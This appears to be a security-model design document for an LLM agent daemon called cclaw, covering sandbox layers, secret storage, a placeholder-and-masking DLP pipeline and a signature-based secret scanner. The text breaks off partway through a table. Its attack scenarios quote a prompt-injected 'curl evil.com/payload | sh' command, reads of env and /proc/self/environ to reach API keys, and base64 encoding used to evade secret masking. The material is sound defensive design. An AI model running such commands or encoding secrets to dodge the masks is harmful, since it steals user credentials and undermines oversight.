# Security Model

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────┐
│  TRUSTED                                                │
│  Daemon process — unsandboxed, holds all secrets,       │
│  sole writer to cclaw.db, forks agents                 │
├─────────────────────────────────────────────────────────┤
│  TRUSTED (config-constrained)                           │
│  Agent process — your compiled C binary, runs LLM loop  │
│  Trusts: own code, env-injected config, own DB          │
│  Constrained by: setrlimit, http_policy, config values  │
├─────────────────────────────────────────────────────────┤
│  UNTRUSTED                                              │
│  Shell children / qjs — execute LLM-directed commands   │
│  Sandboxed by: namespaces, proxy, env stripping         │
│  Cannot: reach arbitrary hosts, read secrets, escape fs │
└─────────────────────────────────────────────────────────┘
```

| Component | Trust level | Why |
|-----------|-------------|-----|
| Daemon | Full | Your binary, root of trust, holds encryption key |
| Agent process | High (self-constrained) | Your binary, but executes LLM-directed logic; respects injected config |
| LLM output | Untrusted input | Adversarial by assumption (prompt injection, jailbreaks) |
| Shell children | Untrusted | Execute arbitrary commands from LLM; kernel-sandboxed |
| JS runtime | Untrusted | Executes LLM-generated code; heap-capped, instruction-limited |
| External HTTP responses | Untrusted | Wrapped in boundary markers, homoglyph-sanitized |

## Agent Process: Trusted Binary, Config-Constrained

The agent process is **your compiled code** — not a container running arbitrary payloads. The security model relies on the agent binary correctly implementing:

1. **Config loading** — reads `CCLAW_*` env vars at startup, builds internal policy structs
2. **Policy enforcement** — `http_check_policy()` called before every outbound connection
3. **Tool dispatch** — workspace path validation, shell timeout, iteration limits
4. **Secret handling** — holds decrypted API key in memory, never logs it, never passes to shell children

### What Could Go Wrong

| Failure mode | Impact | Mitigation |
|--------------|--------|-----------|
| Bug in policy enforcement | Agent reaches blocked host | Code review; integration tests (T116) |
| Agent ignores config limit | Infinite loop, resource exhaustion | `setrlimit` is kernel-enforced (can't be bypassed from userspace) |
| Memory corruption | Arbitrary behavior | `-Wall -Wextra -Werror`, ASAN in dev, arena allocator limits scope |
| Agent leaks secret to LLM context | Key visible in session history | Never include provider-native env var (e.g. `OPENROUTER_API_KEY`) in any message/tool_result; grep for leaks in tests |
| Agent writes to wrong DB | Cross-agent data corruption | Agent only opens `CCLAW_DB` path; writes scoped by agent_name |

### Why This Is Acceptable

- Single user — no multi-tenant isolation requirement
- Binary is compiled from audited source — not downloaded/executed dynamically
- Ephemeral process (one turn) — no long-lived state accumulation
- `setrlimit` provides hard kernel caps regardless of bugs
- Namespace sandbox for shell children provides filesystem isolation even if code has path-traversal bugs

## Config Injection via Environment Variables

Daemon injects config at fork time. Agent reads once at startup, builds internal structs, then operates.

### Principles

1. **Env vars are the sole config source** — agent never reads config files, never opens cclaw.db for config
2. **Parse once, validate early** — `agent_config_from_env()` runs at startup, validates all values, fails fast on malformed input
3. **Immutable after load** — config struct is read-only for process lifetime; no runtime config reload
4. **Fail closed** — missing required var (e.g. `CCLAW_DB`) → `_exit(AGENT_EXIT_ERROR)` immediately
5. **Minimal surface** — only inject what the agent needs; don't pass daemon internals

### Env Var Security Properties

| Var | Sensitivity | Notes |
|-----|-------------|-------|
| `CCLAW_AGENT_NAME` | Low | Identity string |
| `CCLAW_DB` | Low | Path |
| `CCLAW_WORKSPACE` | Low | Path |
| `CCLAW_MODEL` | Low | Model name string |
| `CCLAW_MAX_ITERATIONS` | Low | Integer cap |
| `CCLAW_ALLOWED_HOSTS` | Medium | Defines network perimeter — must not be tampered with |
| `CCLAW_TOOLS` | Medium | Tool whitelist — controls agent capabilities |
| `CCLAW_SHELL_TIMEOUT` | Low | Integer |
| provider-native env var (e.g. `OPENROUTER_API_KEY`) | **High** | Decrypted secret — cleared from env after read |
| `CCLAW_DAEMON_DB` | Low | Path (only if read access granted) |
| `CCLAW_TOKEN_RATE_LIMIT` | Low | Integer |

### Best Practices for Config-Injected Processes

1. **Clear secrets from env immediately after reading**
   ```c
   const char *key = getenv(cfg->provider.api_key_env);
   char *api_key = strdup(key);  // copy to heap
   unsetenv(cfg->provider.api_key_env);  // remove from environ
   ```
   Why: `shell_exec` children inherit env. V47 strips CCLAW_* before exec, but defense-in-depth says don't keep secrets in env longer than necessary.

2. **Validate allowed_hosts before use**
   ```c
   // Reject private IPs in allowed_hosts (daemon should have caught this, but verify)
   for (int i = 0; i < policy.allowed_count; i++)
       if (is_private_ip(policy.allowed[i])) abort();
   ```

3. **Treat CCLAW_TOOLS as a whitelist, not a suggestion**
   - If tool not in list → don't register it
   - Empty list = no tools (not "all tools")
   - Unknown tool name → skip silently (forward compat)

4. **Don't expose config values to LLM**
   - System prompt should not contain `allowed_hosts` list (tells attacker what's reachable)
   - Don't include workspace path in error messages sent to LLM
   - Tool errors: generic "permission denied", not internal details

5. **Log config at startup (debug level), never log secrets**
   ```c
   fprintf(stderr, "[agent] name=%s model=%s tools=%s hosts=%s\n",
           name, model, tools_csv, hosts_csv);
   // Never: fprintf(stderr, "api_key=%s\n", api_key);
   ```

6. **Daemon validates before injection**
   - `allowed_hosts` entries must be valid hostnames (no paths, no wildcards except `*.domain`)
   - `max_iterations` must be positive integer ≤ 200
   - `workspace` must be under `.cclaw/agents/` (prevent path traversal)
   - `tools` must be subset of known tool names

## Defense-in-Depth Layers

Ordered from most to least critical:

| # | Layer | Scope | Kernel-enforced? | Bypassable by agent? |
|---|-------|-------|------------------|---------------------|
| 1 | `setrlimit` | Agent + children | Yes | No |
| 2 | Namespace sandbox | Shell/qjs children | Yes | No (separate process) |
| 3 | Credential proxy (`proxy.c` `decide()`) | Shell/web/js children network | Yes (netns) | No (separate netns) |
| 4 | Env stripping (V47) | Shell children | No (app-level) | Only via code bug |
| 5 | `prctl(PR_SET_PDEATHSIG)` | Orphan cleanup | Yes | No |

Layers 1–3 are hard boundaries (kernel-enforced, separate address space).
Layer 4 is a soft boundary (correct code required).
Layer 5 is bonus hardening (unavailable on some targets).

(The former layer 4 here was `http_check_policy()` — a pre-flight URL check
for `web_fetch`. It's been removed: `web_fetch`/`js_eval` now run inside the
same sandboxed-proxy model as `shell_exec`, so egress for all three tools is
decided by layer 3's `decide()` on every hop, including redirects, which a
single pre-flight check could never see. See `shell-networking.md` and
`egress-filter.md` §8.)

**Don't run cclaw as root.** The namespace sandbox maps the invoking uid to
root inside the child's user namespace (uid_map `0 <uid> 1`, `sandbox.c`).
When the invoking uid is already 0, the child holds *real* root over any
filesystem objects the host uid 0 owns that leak into its mount view, and
read-only bind remounts lose much of their bite (root can often remount or
bypass DAC where an unprivileged mapped uid cannot). Layer 2 degrades from a
hard boundary to a soft one. Run cclaw as an unprivileged user; root is only
appropriate for throwaway containers/VMs where the whole host is disposable.

## Sub-Agent Privilege Reduction (V123)

Two orthogonal mechanisms, both per-turn DB queries:

- **Grants** (`grants` table) = what an agent may *ever* use. Authority, keyed
  by agent identity. Only the approval gate adds rows.
- **Session `tool_filter`** (`sessions.tool_filter`) = what *one session* will
  use. A positive JSON array of tool names, frozen at spawn; `NULL` =
  unrestricted. Effective tools = **grants ∩ filter** — intersection-only.
  Listing an ungranted tool in a filter is a no-op; a filter can never grant.

**Enforcement** happens at both existing gates, re-read from the session row
every turn (no cached state to drift):
- *Payload* (`llm_build_payload`): the tool array shown to the model is
  grants ∩ filter. An agent with zero grants sees zero tools.
- *Dispatch* (`dispatch_tool`): after the grant check, `session_tool_allowed()`
  denies filtered tools with "blocked by this session's tool filter"
  (fail-closed: unknown session ⇒ deny).

**Self-spawn** (`launch_agent` with no `name`): child runs as the *calling*
agent — same grants, fresh session, task in inbox. Filter resolution:
explicit `tools` arg → kv `worker_tools` (conservative default: file tools,
shell_exec, web_fetch, js_eval, check_session, check_approval, search_config;
no memory mutators, no config/agent/extension tools, no launch_agent) →
unrestricted. Passing `tools` with a `name` is an error.

**Named spawn** (launch existing agent): child runs under the target agent's
own grants, unfiltered. The target must already exist (not created at spawn
time); the model picks from a live roster embedded in `launch_agent`'s
description (`agents.name` + `agents.description`, recomputed each turn).

**Lifting a filter** is a manual operation, deliberately outside the agent's
reach: `UPDATE sessions SET tool_filter=NULL WHERE id=?`.

Filters are tools-only in v1 (bare tool names, not `kind:value`); host/path
narrowing may extend the same column later. Depth/concurrency caps apply to
self-spawn unchanged.

## Attack Scenarios

### Prompt injection → shell escape

LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.

Mitigations:
- Shell child in network namespace → all TCP redirected to proxy
- Proxy checks `evil.com` against `allowed_hosts` → denied
- Even if proxy bypassed: filesystem is read-only (namespace remount)
- Even if file written: workspace only, no execute permission on workspace mount

### Prompt injection → secret exfiltration

LLM tries to read API key via `shell_exec("env")` or `file_read("/proc/self/environ")`.

Mitigations:
- V47: all CCLAW_* and API key vars unset before shell exec
- `file_read` restricted to workspace (V1)
- `/proc/self/environ` blocked by namespace (/ is read-only, /proc remounted minimal)
- Agent clears provider-native env var (e.g. `OPENROUTER_API_KEY`) from own env after startup read

### Agent code bug → writes wrong DB

Agent has path traversal in `db_open()` and opens another agent's DB.

Mitigations:
- Agent receives DB path via `CCLAW_DB`; all data scoped by agent_name column
- No cross-agent data access (agent_name enforced in queries)

### Malicious config in cclaw.db

Attacker compromises cclaw.db, sets `allowed_hosts: ["evil.com"]`.

Mitigations:
- cclaw.db is mode 0600, owned by daemon user
- Agent config changes require admin approval (V54)
- Daemon validates config sanity before fork (V64)
- This is a "game over" scenario — if cclaw.db is compromised, attacker has full control regardless

## Single-User Assumptions

CClaw is designed for one user. This simplifies the security model:

- No need for inter-user isolation (all agents serve one person)
- Admin approval = the operator approving via Telegram (not a separate security principal)
- "Trusted binary" assumption holds because the operator compiles it himself
- Secrets encrypted at rest protect against exfiltration of `cclaw.db` *alone* (leaked backup, mis-scoped copy) — **not** full-disk theft (the key file goes with it) or the running system. See [Secret Storage](#secret-storage) for the key-protection ceiling.
- Rate limiting (V71) protects against runaway costs, not against malicious users

If CClaw ever becomes multi-user, the trust model changes fundamentally:
- Agent processes would need hard isolation (containers, VMs)
- Config injection would need cryptographic attestation
- Daemon.db would need per-user access control
- This is explicitly out of scope.

## Secret Storage

Secrets are stored encrypted in cclaw.db (`kv` table, keys prefixed `secret.`) using ChaCha20-Poly1305 AEAD. The 32-byte encryption key lives in `.cclaw_key` on disk, loaded once at daemon startup via `db_set_secret_key()`, never written to the DB. `db_kv_get_secret()` / `db_kv_set_secret()` are the only entry points; no other code touches the raw ciphertext.

Provider API keys resolve env → encrypted kv: `config_load()` reads the provider's `api_key_env` variable first and falls back to the encrypted kv under the same name (admin `set key` and `configure_provider` write there). cclaw has **no `.env` parser** — a `.env` file is user-managed dev convenience that the user's own shell sources before launching cclaw.

**Key-protection ceiling.** The DB store is encrypted at rest, but the key sits on the *same disk* as the ciphertext. Whole-disk theft yields both → plaintext. So the built-in store protects against *exfiltration of `cclaw.db` alone* (a leaked backup, a mis-scoped file copy) — **not** against full-disk capture or the running host. Closing that gap means deriving the key from a user passphrase (KDF) or binding it to hardware (TPM / Secure Enclave) — which is exactly what a keychain storage provider gets for free (see [Storage providers](#storage-providers)). For a single-user box a chmod-600 key file is a reasonable default; it is not a substitute for a hardware-backed vault, and users who care should use the keychain provider.

**The key file is masked from every sandboxed shell child.** `.cclaw_key` lives next to `cclaw.db` (`<dir of db_path>/.cclaw_key`). That directory is *not* in the workspace, so `standard`/`restricted` agents — which bind only the workspace — never see it by construction. But `trusted`/`bootstrap` bind the **CWD rw**, and in CLI mode the CWD *is* the dir holding the key and the DB, which would otherwise expose both to a shell child (key + ciphertext = full secret compromise). To close that, `shell_apply_namespace()` **bind-masks** the key and the DB family (`cclaw.db`, `-wal`, `-shm`) inside the new mount namespace: after the CWD/workspace binds and before `pivot_root`, an empty read-only file is bound over each. Files not reachable in the child's mount tree are skipped — they are already invisible by omission.

The one remaining exposure is **`host`** (`-y` / no-userns dev mode): it runs with *no* sandbox, so a shell child reads the host filesystem directly, key included. That is the documented price of `host` — never run untrusted-derived work at `host` on a box whose `.cclaw_key` matters. See [Trust-Level Policy Bundles](#trust-level-policy-bundles).

### All secrets are injectable

Every secret cclaw stores is referenceable by the model via `{{SECRET:name}}`. This is the only model that makes sense: if the model needs to use a secret — typing a password into a browser field, passing a token in a curl header, authenticating an API call — it needs to know the name to write the placeholder. The security property is that the **value** never enters the context window, not that the name is hidden.

Which secrets the model is *told about* in the system prompt is a separate authoring concern. Operator-provisioned secrets (API tokens cclaw uses autonomously) go in the system prompt explicitly. User-provided credentials (a Gmail password for a login task) the model learns about through conversation — the user says "log into Gmail", the model asks what secret to use, the user says "it's stored as GMAIL_PASSWORD". Either way the contract is the same: model writes the placeholder, cclaw interpolates the value, value never hits context.

### What cclaw is and isn't

cclaw is a **secret broker**, not a password manager — but it *is* a secret store. The distinction is broker-vs-lifecycle, not store-vs-nothing:

- cclaw **owns** the broker: resolve at the trust boundary, inject into tool calls, mask on the way back, scope per-agent. This is the part that must be correct — it is the DLP filter, and it runs the same regardless of where the value is stored.
- cclaw **owns** storage only as a *provider* (see [Storage providers](#storage-providers)). The default DB store is convenience storage with a key-on-disk ceiling, not the root of trust a real vault gives you.
- cclaw **does not** own lifecycle: rotation, expiry, breach alerts, secure-entry UX, autofill, or per-access audit. That belongs to the OS keychain or whatever password manager the user already runs.

So "trust the agent to manage my passwords" is half-right: cclaw will *broker* them safely (the value never enters the context window), but it should not *be your vault* unless you accept the key-on-disk ceiling above. Users who care should point cclaw at a keychain provider and let the OS own key protection and lifecycle.

### Secret scoping

Each secret has a scope: `"*"` (all agents) or a comma-separated agent name list. Daemon enforces scope at injection time — an agent only receives secrets it is scoped for. Sub-agents inherit the intersection of their own scope and the parent's (same privilege-reduction rule as tools and hosts).

**Three orthogonal axes.** Secret access is *scope* — do not collapse it into trust_level:

| Axis | Mechanism | Question it answers |
|------|-----------|---------------------|
| Stored | storage provider (DB / keychain) | does cclaw hold the value at all? |
| Scoped | `scope: "*"` or agent list | which agents *receive* it at injection? |
| Disclosed | system-prompt authoring | which agents are *told the name*? |

trust_level governs sandbox strictness (env scrub, network, rlimits) — what a compromised agent can *do*, not which secrets it sees. The axes compose (a `restricted` agent with empty scope sees nothing and can reach nothing) but must stay independent: never gate secret access on trust_level by accident.

### Storage providers

Storage sits behind a thin provider interface — `secret_resolve(name)` / `secret_list()` — so the broker (resolve / inject / mask / scope) never knows where a value came from. This is the seam that keeps "are we a password manager?" answerable: the broker is fixed, the vault is pluggable.

| Provider | Status | Key protection |
|----------|--------|----------------|
| cclaw.db ChaCha20 | #1, default | key file on disk (chmod 600) — see [key-protection ceiling](#secret-storage) |
| OS keychain (libsecret / macOS Keychain / Windows CredMan) | future | OS-managed, hardware-backed where available |
| User's existing password manager | future | owned by the PM |

A keychain or PM provider slots in **without touching the DLP layer** — the broker calls the same two functions. One unavoidable constraint holds for every provider: even a hardware-backed secret must be pulled into process memory transiently for injection and masking. "Value never lives in cclaw" can only mean *never persisted by cclaw, held only for the duration of a turn.*

### Future: Secret Agent (zero-data-retention capture)

When a user pastes a raw credential into the conversation (e.g. "here's my token: ghp_abc123..."), the AC scanner fires on the user message. Rather than storing the plaintext in the session, the intended flow is:

```
User pastes token → AC scanner detects pattern
  → route to Secret Agent (ZDR model endpoint)
  → Secret Agent extracts name + value, writes to encrypted store
  → Main session sees: "Stored as {{SECRET:GITHUB_TOKEN}}"
```

The secret agent runs against a zero-data-retention model endpoint (Anthropic ZDR, Azure OpenAI with data-at-rest off, or a local model) so the plaintext never touches a provider's logs. Its context is never persisted to the `entries` table. It has access to a single privileged tool: `secret_store_write`, gated to `trust_level = "secret_agent"`.

This is not yet implemented. Until it is, the AC scanner redacts detected secrets from user messages before storage, and the user is prompted to add them via `db_kv_set_secret` directly (CLI or bootstrap agent).

Open questions deferred: secret TTL/rotation, audit trail of per-agent access, multi-secret OAuth transactions, user confirmation flow before auto-store.

## DLP Pipeline: Resolve / Inject / Mask

Every piece of text that crosses a trust boundary goes through a consistent three-verb pipeline. The verbs always run in this order; never skip one, never reorder.

```
                   ┌─────────────────────────────────────┐
                   │         CONTEXT WINDOW               │
                   │   (entries table, LLM messages)      │
                   │                                       │
                   │  Placeholders only: {{SECRET:name}}  │
                   │  No raw secret values ever stored     │
                   └──────────┬──────────────┬────────────┘
                              │              │
                   [INJECT]   │              │  [MASK]
                              ▼              ▼
                   ┌──────────────────────────────────────┐
                   │         TRUST BOUNDARY                │
                   │  tool dispatch / shell fork / inbox   │
                   └──────────────────────────────────────┘
                              │
                   [RESOLVE]  │
                              ▼
                   ┌──────────────────────────────────────┐
                   │         SECRET STORE                  │
                   │  cclaw.db kv enc: + CCLAW_SECRET_*   │
                   └──────────────────────────────────────┘
```

### Resolve

`agent_setup_init()` loads all secrets the agent is scoped for into `AgentSetup.secrets` (`ShellSecret[]`):

1. `shell_secrets_collect()` — reads `CCLAW_SECRET_*` env vars
2. `load_db_secrets()` — queries `kv WHERE key LIKE 'secret.%'`, decrypts each via `db_kv_get_secret()`

Minimum value length: 8 chars. Shorter values are skipped with a warning — they are both weak secrets and dangerous to mask (too many innocent matches in output).

Values are held in process memory for the duration of the turn, then freed. They are never written to any log or DB column.

### Inject

Before a tool handler runs, `secret_interpolate()` replaces `{{SECRET:name}}` in the tool arguments with the real value. The interpolated string is a transient local passed to the handler and freed immediately; the persisted tool-call arguments (`tc->arguments`) keep the placeholder, so context/history never holds the value.

Injection is restricted to tools that actually exec with credentials (`tool_needs_interpolation()` — `shell_exec`, `web_fetch`, `js_eval`). Tools that only read files or query the DB don't need it and don't get it.

**Two delivery channels into a shell child** (both available; pick by quoting context):

| Channel | How the model writes it | Where the value lands |
|---------|------------------------|------------------------|
| Placeholder interpolation | `curl -H 'Bearer: {{SECRET:X}}'` | the value, substituted into the **command string / `/bin/sh` argv** |
| Env injection | `curl -H "Bearer: $CCLAW_SECRET_X"` | `CCLAW_SECRET_<NAME>=<value>` in the child **env**, stripped before any grandchild |

Placeholder interpolation is the **primary** channel: it is robust to quoting. Note the single-quote case — `'Bearer: {{SECRET:X}}'` interpolates correctly, but `'Bearer: $CCLAW_SECRET_X'` would **not** expand (single quotes suppress shell expansion). Env injection is a secondary mechanism for tools that read credentials from the environment, not an interchangeable alternative.

**Env injection is scoped to referenced secrets.** A shell child receives `CCLAW_SECRET_<NAME>` only for the secrets whose `$CCLAW_SECRET_<NAME>` token actually appears in the command (`shell_filter_secrets()`). Secrets used via `{{SECRET:NAME}}` are already interpolated into the command and get no env var. This is least-privilege: without it, every command would carry the agent's entire scoped credential set, and a single `cat /proc/self/environ` would dump them all.

**Why argv exposure of the in-use secret is bounded, not a hole.** A secret the command *uses* must be plaintext somewhere in that process — argv (`/proc/self/cmdline`), env (`/proc/self/environ`), or its heap. You cannot hide a value from the command that consumes it. What matters is not "can the child read it" but two containment properties, both of which hold:

- **It can't get back into the model's context.** A `... ; cat /proc/self/cmdline` leak is masked by `tool_result_postprocess()` *before* the result reaches the context window — the model only ever sees `{{SECRET:NAME}}`, never the plaintext. Defeating this requires the model to *encode* the value inside the command (`| base64 | rev`) so the known-value mask misses it — the documented "accidental, not determined-adversary" limit.
- **It can't leave to an attacker.** The shell child runs in `CLONE_NEWNET`; all egress is forced through the credential proxy's `allowed_hosts` allowlist. An encoded value still can't be POSTed anywhere off-allowlist.

The host never sees the value either (PID namespace + remounted `/proc`). For HTTP credentials specifically, the **proxy** is the only mechanism that denies the plaintext to the child entirely — it injects the auth header at the network boundary so the value never enters argv/env/heap at all (see [shell-networking.md](shell-networking.md)). That's the right tool for network tokens; interpolation remains necessary for non-network uses (a CLI password prompt, a token written to a config file).

### Mask

After a tool handler returns (and on all inbound user messages), two masking passes run in order, both inside `tool_result_postprocess()` — the **single masking chokepoint** for every tool. There is no per-tool masking; `shell_exec`, `web_fetch`, and `js_eval` all converge here so they get identical treatment.

**Pass 1 — Known-value mask** (`secret_deinterpolate`):
- Scans output for literal secret values **plus their base64- and URL-encoded variants**
- Replaced with `{{SECRET:name}}` so the model can re-reference on the next turn if needed
- Longest secret first to avoid partial matches on shared substrings

**Pass 2 — AC pattern scan** (`secret_scan` / `secret_scan_redact`):
- Catches secrets that leaked through output but weren't in the known store (e.g. a token from a `git config` dump, a key from an `.env` file read)
- O(n) single pass, no backtracking — see Secret Scanner section below
- Findings replaced with `[SECRET_DETECTED:<rule_id>]`

The token difference is by design: pass 1 *knows which secret it is* → re-referenceable `{{SECRET:name}}`; pass 2 only matched a *signature* → opaque `[SECRET_DETECTED:rule]`.

Both passes run before `entry_append` (tool results) and before `inbox_insert` (user messages). Nothing enters the entries table or context window without going through both.

### Per-tool flow

`shell_exec` is a forked tool, so its round-trip threads two forks; the value lives only in transient process memory and never on the persisted path:

```
tool_call args (placeholder)  ──► persisted to entries (placeholder kept)
   │
   ▼ fork #1 (tool-exec child, trusted C)
   │   secret_interpolate → real value in this child's heap
   │   tool_shell_handler
   │      ▼ fork #2 (sandbox child)  →  execl /bin/sh -c  (value in argv)
   │      stdout/stderr ─► pipe ─► handler returns raw output
   ▼ parent drains pipe
     tool_result_postprocess  ──►  deinterpolate (→ {{SECRET:name}}) + AC scan
     entry_append (masked)
```

All three credential tools share the parent chokepoint and so behave uniformly:

| Tool | inline/forked | interp site | known-value token | base64/URL masked | re-referenceable |
|------|---------------|-------------|-------------------|-------------------|------------------|
| `shell_exec` | forked | fork #1 child | `{{SECRET:name}}` | yes | yes |
| `web_fetch` | forked | fork child | `{{SECRET:name}}` | yes | yes |
| `js_eval` | inline | parent | `{{SECRET:name}}` | yes | yes |

### Chokepoints

| Text source | Resolve | Inject | Mask pass 1 | Mask pass 2 |
|-------------|---------|--------|-------------|-------------|
| User message (CLI/channel) | — | — | yes | yes |
| Tool args (outbound) | yes | yes | — | — |
| Tool result (inline) | — | — | yes | yes |
| Tool result (forked shell) | — | — | yes | yes |
| JS eval output | — | — | yes | yes |
| inbox message (channel inbound) | — | — | yes | yes |

The rule: **anything heading into entries goes through both mask passes (via `tool_result_postprocess`); anything heading into a tool exec goes through inject.**

## Secret Scanner (AC-based Content DLP)

The AC scanner is the second masking pass — it catches secrets the known-value mask couldn't, because they were never stored (a token embedded in a cloned repo, credentials echoed from a subprocess).

### How it works

1. **Aho-Corasick automaton** — keywords compiled into a compressed state machine at build time (from `vendor/gitleaks.toml`). 313 states, 34 columns (vs 128 in a naive dense table). O(n) single-pass scan, zero heap allocation.
2. **Case folding** — scan folds uppercase to lowercase at scan time (`b |= 0x20`); the column remap (`scan_ac_col[128]`) maps both cases to the same column, so uppercase variants are caught without separate rules.
3. **Prefix validation** — on AC match, verify the tail chars match expected charset and length (e.g., `AKIA` + 16 uppercase alphanums).
4. **Case re-check** — case-sensitive rules (e.g. Twilio `SK`) re-verify exact bytes via `strncmp` after the case-insensitive AC prefilter. The AC table is a prefilter only; it never loosens a case-sensitive rule.
5. **Contextual detection** — for generic keywords (`token`, `password`, `api_key`), check for assignment pattern within 30 chars and entropy > 3.5 bits/byte.
6. **Entropy** — Shannon entropy `H = -Σ p(x) log₂ p(x)` over the matched tail. Separates `AKIAIOSFODNN7EXAMPLE` (high entropy, random-looking) from `mypassword` (low entropy, English-like). Entropy is capped at `log₂(tail_max)` — a rule can't demand more bits than the tail length allows distinct symbols.
7. **Redaction** — matched regions replaced with `[SECRET_DETECTED:<rule_id>]`.

### Why AC can't replace known-value masking

The AC scanner detects secrets **by signature** — a distinctive prefix, charset, entropy floor. A user's personal password has no signature: no prefix, often low entropy, no fixed length. It is structurally undetectable by pattern. The known-value mask (pass 1) handles user passwords because cclaw already *has* the value; it scans for the literal string. The two passes are complementary, not redundant:

| | Catches | Mechanism |
|---|---------|-----------|
| Known-value mask | secrets cclaw stored | literal/encoded substring match |
| AC pattern scan | secrets cclaw never saw | signature match |

### Limits of the AC scanner

- **Short/common values are undetectable.** The entropy floor and minimum tail length exist precisely because short values match too much innocent text. A 6-char password can't be reliably distinguished from a word. This is a fundamental limit, not a bug.
- **Encoding evasion.** The scanner catches raw, base64, and URL-encoded variants of known secrets (in the known-value pass) and signature-matching patterns (in the AC pass). Hex encoding, gzip, character splitting, or hashing evade both. The scanner catches *accidental* leakage, not deliberate exfiltration by the model.
- **The model learns secret names through conversation.** If the user says "log into Gmail using GMAIL_PASSWORD", the model knows that name exists. That's expected — the model needs the name to write the placeholder. The security property is that the *value* never enters context, not that the name is hidden.

### Coverage

66 rules curated from gitleaks (AWS, GCP, Azure, GitHub, GitLab, Anthropic, OpenAI, Slack, Stripe, Twilio, Vault, npm, PyPI, private keys, JWTs, etc.).

Regenerate: `python scripts/gen_secret_scan.py` from `vendor/gitleaks.toml`.

## {{SECRET:name}} Interpolation

Secrets are referenced by placeholder in the LLM context. The full round-trip:

```
LLM writes:  curl -H "Authorization: Bearer {{SECRET:GITHUB_TOKEN}}" ...
cclaw does:  interpolate → execute → deinterpolate → AC scan → store
Stored:      curl -H "Authorization: Bearer {{SECRET:GITHUB_TOKEN}}" ...
```

The actual value **never enters the entries table or context window**.

- `secret_interpolate()` — replaces `{{SECRET:X}}` with real value before tool exec
- `secret_deinterpolate()` — replaces secret values (raw + base64 + URL-encoded) back to `{{SECRET:X}}`, longest first
- AC scanner — catches any other secrets that leaked through output
- All three run in `tool_result_postprocess()`, the single masking chokepoint shared by every tool

Tell the LLM about operator-provisioned secrets in the system prompt:
> You have these secrets available: `{{SECRET:GITHUB_TOKEN}}`, `{{SECRET:NPM_TOKEN}}`.
> Use `{{SECRET:name}}` in tool arguments. Never write actual secret values.

User-provided credentials don't need to be listed in the system prompt — the user will tell the model the name when they ask it to perform a task ("log in using GMAIL_PASSWORD"). The model then writes `{{SECRET:GMAIL_PASSWORD}}` in the tool argument exactly as it would for any other secret.

## JS Secret Handles (design — not yet implemented)

**Today**, `js_eval` is in `tool_needs_interpolation()`, so `{{SECRET:X}}` is substituted into the **JS source text** before `eval`. The plaintext then lives in the QuickJS heap for the whole run — the one place a secret value still enters an interpreter's memory. `web_fetch` avoids this (it resolves in C and hands the value to libcurl; the value never touches an interpreter), and `shell_exec` can't avoid it (cclaw isn't the HTTP client there — see [the Inject section](#inject)). `js_eval` is the case where a real isolation win is cheaply available, because cclaw owns the JS `fetch()` implementation and the engine bindings.

### The model: inject the accessor, not the value

`SECRET` is a **native binding** — a C callback on the JS global, like `fetch` or `console.log`. It is *code, not data*. Calling `SECRET("X")` returns an **opaque handle that carries only the name**, never the plaintext:

```
JS context (QuickJS heap)          C side (trusted)
─────────────────────────          ─────────────────────────
SECRET            ──native──►       callback: wrap name → handle
SECRET("X")  →  <opaque ref "X">    (name only, no value)
crypto.hmac(h, d) ──native──►       resolve "X" in AgentSetup.secrets,
                  ◄── digest        HMAC in C, return only the digest
```

The values already live in C (`AgentSetup.secrets`, loaded at resolve time). Native primitives resolve `name → value` *internally*, do the work, and return only a non-sensitive result. The plaintext is never marshalled into a JS value. This deletes the source-interpolation path: the JS source contains `SECRET("X")` calls, never the value.

A nice consequence: primitive outputs (a digest, a signed token, a TOTP code) reveal nothing about the key, so there is **nothing to mask** on the way back out of these calls.

### Why this is robust (and what forgery does/doesn't buy)

Containment is a property of *which bindings exist*, not of hiding a field. The value stays out of JS because **no native function returns it** — `SECRET` returns a handle, the primitives return outputs. The only binding that would marshal plaintext back into JS is the explicit escape hatch:

- `SECRET("X").reveal() → string` — materializes the plaintext into the JS heap, for the genuine long tail (a bespoke protocol, a library that wants raw bytes, passing the value to a subprocess). One grep-able, **trust-level-gated** call (e.g. denied for `restricted`/`standard`, allowed for `trusted`) instead of today's silent always-on source interpolation.

The handle should be a tagged native object (QuickJS class id + opaque), not a plain `{__secretRef:"X"}` literal, so a primitive can confirm it came from `SECRET()` and so `.reveal()` is a real method rather than a forgeable property. But note: **forging a name-handle grants nothing.** A forged `{name:"DEPLOY_KEY"}` passed to `hmac` resolves the same secret a real `SECRET("DEPLOY_KEY")` would — the model can name any *scoped* secret anyway, and resolution still fails for anything outside the agent's scope. The tag is hygiene and the anchor for `reveal()`, not the security boundary.

### Primitive set, by priority

Each takes a handle, consumes the secret in C, returns a maskingsafe output.

**Tier 1 (~80% of real auth):**

| Primitive | JS shape | Covers |
|-----------|----------|--------|
| fetch header inject | `fetch(url, {headers:{Authorization:"Bearer "+SECRET("X")}})` | bearer tokens, API keys, Basic auth |
| HMAC | `crypto.hmac("sha256", SECRET("X"), data) → hex/b64` | webhook signing, custom HMAC auth; building block for the rest |

HMAC is load-bearing: HS256-JWT and TOTP become thin wrappers, and AWS SigV4 is a JS recipe where only the first HMAC takes the root handle (`hmac(SECRET("AWS"), date)` → `kDate` in C; the chain continues on derived keys, root never enters JS).

**Tier 2 (cheap once HMAC exists):** `totp(SECRET("X")) → code`; `crypto.signJwt(SECRET("X"), {claims}) → token` (HS256).

**Tier 3 (deferred — bigger lift):** asymmetric signing (JWT RS256/ES256) needs RSA/ECDSA, which vendored monocypher does not provide (it has Ed25519/X25519/ChaCha/BLAKE2/SHA-512, not RSA or SHA-256). Defer until demanded.

**Implementation cost:** HMAC-SHA256 needs SHA-256, absent from monocypher — ~150 lines of vendored public-domain SHA-256 plus a thin HMAC wrapper. Small but net-new crypto; everything in Tier 1/2 sits on that one addition. Building just **fetch-inject + `crypto.hmac`** covers bearer/API-key, webhook signing, SigV4, HS256-JWT and TOTP with the root secret staying in C.

### When the value genuinely belongs in JS

Some auth fundamentally needs the raw key in the compute context — the algorithm consuming the secret lives in the JS, not in a header-interpolator (HMAC/SigV4/JWT signing, TOTP), or the use isn't a request at all (local decryption, a JS DB driver, deriving a child key). The handle + C-primitive model covers the common members of that set without revealing the root; `.reveal()` covers the rest, deliberately and visibly. The goal is not "secrets never touch JS" — it is "value-in-JS is opt-in and audited, not the default."

## Trust-Level Policy Bundles

The `agents.trust_level` column maps to a shell sandbox profile:

| Policy | trusted | standard (default) | restricted |
|--------|---------|-------------------|------------|
